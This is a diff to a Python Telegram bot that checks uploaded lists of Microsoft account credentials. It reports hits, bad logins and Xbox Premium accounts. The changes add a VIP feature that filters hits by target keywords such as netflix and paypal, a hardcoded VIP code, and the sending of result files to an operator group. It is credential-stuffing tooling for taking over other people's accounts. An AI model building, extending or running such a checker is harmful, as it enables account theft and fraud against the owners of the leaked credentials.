-                send_document(GROUP_ID, path, caption=f"{user_tag}{vip_tag} | Done. Hits: {sess.hits} | Bads: {sess.bads} | Total: {sess.total}")
-                if xbox_path:
-                    send_document(GROUP_ID, xbox_path, caption=f"{user_tag}{vip_tag} | xbox ({len(sess.results_xbox)})")
-            except:
-                pass
-            try:
-                if xbox_path: os.remove(xbox_path)
-                if path: os.remove(path)
-            except: pass
+                _send_final_file(sess.results_xbox, "xbox_final",
+                                 f"🎮 Xbox Premium | {len(sess.results_xbox)} hits",
+                                 f"Xbox Premium | {len(sess.results_xbox)}")
+            # Target keyword results (if any)
+            if sess.target_keywords:
+                kw_label = ", ".join(sess.target_keywords[:3])
+                # Collect target lines from all hits
+                target_lines_ms = list(sess.batch_target_ms) if sess.batch_target_ms else []
+                target_lines_mix = list(sess.batch_target_mix) if sess.batch_target_mix else []
+                if target_lines_ms:
+                    _send_final_file(target_lines_ms, "target_ms_final",
+                                     f"🎯 MS Target [{kw_label}] | {len(target_lines_ms)} matches",
+                                     f"MS Target [{kw_label}] | {len(target_lines_ms)}")
+                if target_lines_mix:
+                    _send_final_file(target_lines_mix, "target_mix_final",
+                                     f"🎯 MIX Target [{kw_label}] | {len(target_lines_mix)} matches",
+                                     f"MIX Target [{kw_label}] | {len(target_lines_mix)}")
         except:
             send_message(chat_id, "Failed to prepare results")
+        # VIP reminder: unlimited plan
+        if chat_id in vip_users_info:
+            send_message(chat_id, "You can send more files — your plan is unlimited.")
         with self.lock:
             self.sessions.pop(chat_id, None)
 
@@ -1916,8 +1980,14 @@ class BotApp:
         sess.pending_accounts = accounts
 
         if chat_id in vip_users_info:
-            t = threading.Thread(target=self.start_scan, args=(chat_id, accounts), daemon=True)
-            t.start()
+            # Ask VIP user for target keywords first
+            kb = {"inline_keyboard": [[{"text": "⏭ Skip (no target)", "callback_data": f"SKIP_TARGET_{chat_id}"}]]}
+            sess.awaiting_target_keywords = True
+            send_message(chat_id,
+                "🎯 Send your target keywords (comma separated):\n"
+                "Example: netflix, facebook.com, paypal\n\n"
+                "Or press skip to scan without a target.",
+                reply_markup=kb)
         else:
             self._handle_free_flow(chat_id, sess)
 
@@ -2003,10 +2073,6 @@ class BotApp:
             print("Set TELEGRAM_BOT_TOKEN env")
             return
         try:
-            set_my_description(INTRO_TEXT)
-        except:
-            pass
-        try:
             drop_env = os.getenv("DROP_PENDING_UPDATES", "true").strip().lower()
             if drop_env in ("1", "true", "yes", "y", "on"):
                 j = get_updates(None, timeout=0)
@@ -2021,10 +2087,6 @@ class BotApp:
             pass
         while True:
             try:
-                self._leader_tick()
-                if not IS_LEADER:
-                    time.sleep(2)
-                    continue
                 j = get_updates(self.offset, timeout=50)
                 if not j.get("ok"):
                     time.sleep(2)
@@ -2091,25 +2153,44 @@ class BotApp:
                                             self._handle_vip_flow(chat_id, sess)
                                         else:
                                             send_message(chat_id, "Send the file to start")
+                                continue
+
+                            # Handle VIP target keyword entry
+                            if sess and getattr(sess, "awaiting_target_keywords", False):
+                                if txt.lower() == "skip":
+                                    sess.awaiting_target_keywords = False
+                                    sess.target_keywords = []
+                                    if sess.pending_accounts:
+                                        t = threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True)
+                                        t.start()
+                                else:
+                                    parts = re.split(r'[,\u060C،]+', txt)
+                                    kws = [p.strip() for p in parts if p.strip()]
+                                    if not kws:
+                                        send_message(chat_id, "Please send at least one keyword, or type skip.")
                                     else:
-                                        # proceed free if user already sent a file
-                                        sess.awaiting_vip_code = False
+                                        sess.awaiting_target_keywords = False
+                                        sess.target_keywords = kws
+                                        kw_display = ", ".join(kws)
+                                        send_message(chat_id, f"✅ Target set: {kw_display}\nStarting scan...")
                                         if sess.pending_accounts:
-                                            self._handle_free_flow(chat_id, sess)
-                                        else:
-                                            send_message(chat_id, "VIP code invalid. You can send a file to run free plan.")
+                                            t = threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True)
+                                            t.start()
                                 continue
 
                             if txt.lower() in ("/start", "start"):
-                                send_message(chat_id, "This bot for check Microsoft accounts\n\nMain channel : @anon_main1\n\nEnjoy")
-                                kb = {"inline_keyboard": [[{"text": "VIP", "callback_data": "VIP_ENTER"}]]}
-                                send_message(chat_id, "if you have code vip , click on vip and send it\n\nif dont have vip and want free , just send file", reply_markup=kb)
+                                kb = {
+                                    "inline_keyboard": [
+                                        [{"text": "🔑 Enter VIP Code", "callback_data": "VIP_CODE_ENTER"}]
+                                    ]
+                                }
+                                send_message(chat_id, "Welcome to Q Bot\nIf you have a VIP code, press the button below.\nIf you don't have a code, send the file for checking directly.", reply_markup=kb)
                                 continue
                             # user claims VIP code
                             if txt.lower().startswith("code") or txt.lower().startswith("vip") or txt.lower() == "codevipanon199":
                                 parts = txt.replace(":", " ").split()
                                 code = parts[-1] if len(parts) >= 1 else ""
-                                ok, msg = try_claim_vip(chat_id, code)
+                                ok, msg = try_claim_vip(from_id, code)
                                 send_message(chat_id, msg)
                                 if ok:
                                     kb = {"inline_keyboard": [[{"text": "Search", "callback_data": "VIP_SEARCH"}]]}
@@ -2174,12 +2255,23 @@ class BotApp:
 
                         if data.startswith("STOP_"):
                             self.handle_stop(chat_id)
-                        elif data == "VIP_ENTER":
+                        elif data.startswith("SKIP_TARGET_"):
+                            with self.lock:
+                                sess = self.sessions.get(chat_id)
+                            if sess and getattr(sess, "awaiting_target_keywords", False):
+                                sess.awaiting_target_keywords = False
+                                sess.target_keywords = []
+                                if sess.pending_accounts:
+                                    send_message(chat_id, "⏭ No target set. Starting scan...")
+                                    t = threading.Thread(target=self.start_scan, args=(chat_id, sess.pending_accounts), daemon=True)
+                                    t.start()
+                        elif data == "VIP_CODE_ENTER":
                             with self.lock:
                                 sess = self.sessions.get(chat_id) or ScanSession(chat_id)
                                 self.sessions[chat_id] = sess
                             sess.awaiting_vip_code = True
-                            send_message(chat_id, "Please enter your VIP code now (or type 'cancel').")
+                            kb = {"inline_keyboard": [[{"text": "❌ Cancel", "callback_data": f"PLAN_CANCEL_{chat_id}"}]]}
+                            send_message(chat_id, "🔑 Please enter your VIP code:", reply_markup=kb)
                         elif data == "VIP_SEARCH":
                             if chat_id in vip_users_info:
                                 with self.lock:
